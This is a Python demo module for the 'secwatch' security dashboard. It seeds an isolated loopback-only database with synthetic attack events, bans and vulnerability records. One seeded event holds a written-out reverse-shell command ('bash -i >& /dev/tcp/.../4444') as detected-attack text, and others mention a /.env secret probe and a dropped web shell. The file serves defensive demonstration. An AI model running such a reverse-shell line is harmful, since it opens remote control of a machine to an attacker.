"""Demo mode — seed a throwaway DB with realistic synthetic data and serve the
dashboard, so anyone can see what secwatch looks like populated without pointing it
at real logs.

    python -m secwatch.demo        # seeds ./data/demo.db and serves on 127.0.0.1:8931

Nothing here touches a real deployment: it uses a separate demo DB, binds loopback,
and runs with auth off (loopback is exempt from the exposure guard).
"""
import logging
import time

from . import config, db

log = logging.getLogger("secwatch.demo")

_DEVICES = ["demo-core", "demo-edge", "demo-app"]

# (offset_seconds_ago, ip, rule, severity, host, path, detail, count, device)
_EVENTS = [
    (30, "45.148.10.7", "secret_probe", "high", "app.demo", "/.env",
     "probe for secret file /.env", 1, "demo-edge"),
    (120, "45.148.10.7", "scan", "info", "app.demo", "/wp-login.php",
     "path scanning (12 unique 404s)", 12, "demo-edge"),
    (300, "193.32.162.44", "login_bruteforce", "high", "app.demo", "/api/login",
     "42 failed logins in 60s", 42, "demo-core"),
    (900, "5.188.206.130", "cred_stuff", "high", "app.demo", "/api/login",
     "credential stuffing across 30 accounts", 30, "demo-core"),
    (1800, "141.98.11.9", "flood", "medium", "app.demo", "/",
     "request flood: 640 req/min", 640, "demo-edge"),
    (2400, "10.10.0.55", "privileged_access", "high", "internal.demo", "/admin",
     "internal host hit /admin (403)", 3, "demo-app"),
    (3600, "185.220.101.4", "webshell_dropped", "high", "app.demo",
     "/var/www/app/upload/x.php", "new .php dropped in web dir", 1, "demo-core"),
    (5400, "192.99.4.21", "ssh_brute", "high", "", "", "SSH brute force (88 fails)", 88, "demo-app"),
    (7200, "45.148.10.7", "reverse_shell", "high", "", "",
     "bash -i >& /dev/tcp/45.148.10.7/4444 detected", 1, "demo-edge"),
    (9000, "77.75.230.11", "crawler", "info", "app.demo", "/products", "aggressive crawl", 210, "demo-core"),
]

# (ip, rule, reason, ttl_hours, banned_by)
_BANS = [
    ("45.148.10.7", "secret_probe", "probed /.env then dropped a reverse shell", 24, "cluster:demo-edge"),
    ("193.32.162.44", "login_bruteforce", "42 failed logins in 60s", 24, "auto"),
    ("5.188.206.130", "cred_stuff", "credential stuffing", 24, "auto"),
    ("192.99.4.21", "ssh_brute", "SSH brute force", 48, "cluster:demo-app"),
    ("203.0.113.77", "community", "community blocklist (18 reporters)", 72, "community"),
]

# (cve, image, pkg, installed, fixed, severity, in_kev)
_VULNS = [
    ("CVE-2026-31431", "host: Ubuntu 24.04", "linux-headers", "6.8.0-100", "6.8.0-117", "HIGH", 1),
    ("CVE-2025-52104", "app.demo:latest", "openssl", "3.0.2", "3.0.13", "CRITICAL", 0),
    ("CVE-2025-40910", "app.demo:latest", "zlib1g", "1.2.11", "1.2.13", "HIGH", 0),
    ("CVE-2024-99120", "redis:7", "libc6", "2.35", "2.35-0ubuntu3.7", "HIGH", 0),
]


def seed(conn, now=None):
    """Insert the synthetic dataset. Idempotent-ish (safe to re-run)."""
    now = now or time.time()
    for d in _DEVICES:
        conn.execute("INSERT OR REPLACE INTO devices(device,first_seen,last_seen,is_self) "
                     "VALUES(?,?,?,?)", (d, now - 86400, now - 20, 1 if d == "demo-core" else 0))
    for off, ip, rule, sev, host, path, detail, count, device in _EVENTS:
        conn.execute("INSERT INTO events(ts,ip,rule,severity,host,path,ua,detail,count,device) "
                     "VALUES(?,?,?,?,?,?,?,?,?,?)",
                     (now - off, ip, rule, sev, host, path, "Mozilla/5.0 (demo)",
                      detail, count, device))
    # per-minute traffic for the sparklines (last 2h, a couple of noisy IPs)
    base_min = int(now // 60)
    for m in range(120):
        minute = base_min - m
        req = 30 + (m * 7) % 90
        conn.execute("INSERT OR REPLACE INTO traffic(minute,requests,s4xx,s5xx) VALUES(?,?,?,?)",
                     (minute, req, req // 5, req // 40))
        for ip in ("45.148.10.7", "141.98.11.9"):
            conn.execute("INSERT OR REPLACE INTO ip_minute(minute,ip,requests,s4xx) VALUES(?,?,?,?)",
                         (minute, ip, (m * 3) % 40, (m * 2) % 20))
    for ip, rule, reason, ttl, by in _BANS:
        conn.execute("INSERT OR REPLACE INTO bans(ip,rule,reason,created,expires,banned_by) "
                     "VALUES(?,?,?,?,?,?)", (ip, rule, reason, now - 600, now + ttl * 3600, by))
    for cve, image, pkg, inst, fixed, sev, kev in _VULNS:
        conn.execute("INSERT OR REPLACE INTO vulnerabilities"
                     "(cve,image,pkg,installed,fixed,severity,in_kev,title,first_seen,last_seen) "
                     "VALUES(?,?,?,?,?,?,?,?,?,?)",
                     (cve, image, pkg, inst, fixed, sev, kev, f"{pkg} {sev} vulnerability",
                      now - 3600, now))
    conn.commit()
    return {"events": len(_EVENTS), "bans": len(_BANS), "vulns": len(_VULNS)}


def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(name)s %(levelname)s %(message)s")
    # isolate: separate DB, loopback bind, no auth (loopback is guard-exempt)
    config.DB_PATH = config.DB_PATH.parent / "demo.db"
    config.LISTEN_HOST = "127.0.0.1"
    config.AUTH_ENABLED = False
    config.CVE_SCAN = False          # don't kick off a real scan in demo mode
    config.LLM_ANALYSIS = False
    config.CROWD_ENABLED = False     # keep the demo to exactly the seeded data —
    config.CLUSTER_ENABLED = False   # no live crowd pulls / cluster gossip mixing in
    config.LOG_SOURCES = []          # never tail a real access log in demo mode
    config.MODE = "core"             # CRITICAL: no host collectors (ssh/process/host/
                                     # kern watchers) — they'd write REAL host events
                                     # (your IP, hostnames) into the demo DB.
    config.BAN_ACTUATOR = "none"     # CRITICAL: never write the real Traefik/nftables
    config.AUTOBAN = False           # ban file — the seeded demo bans would clobber it.
    try:
        config.DB_PATH.unlink()      # fresh DB each run so nothing real lingers
    except OSError:
        pass
    conn = db.connect()
    counts = seed(conn)
    conn.close()
    import uvicorn
    log.info("demo data seeded (%s). Open http://127.0.0.1:%d/", counts, config.LISTEN_PORT)
    uvicorn.run("secwatch.web:app", host="127.0.0.1", port=config.LISTEN_PORT, log_level="warning")


if __name__ == "__main__":
    main()
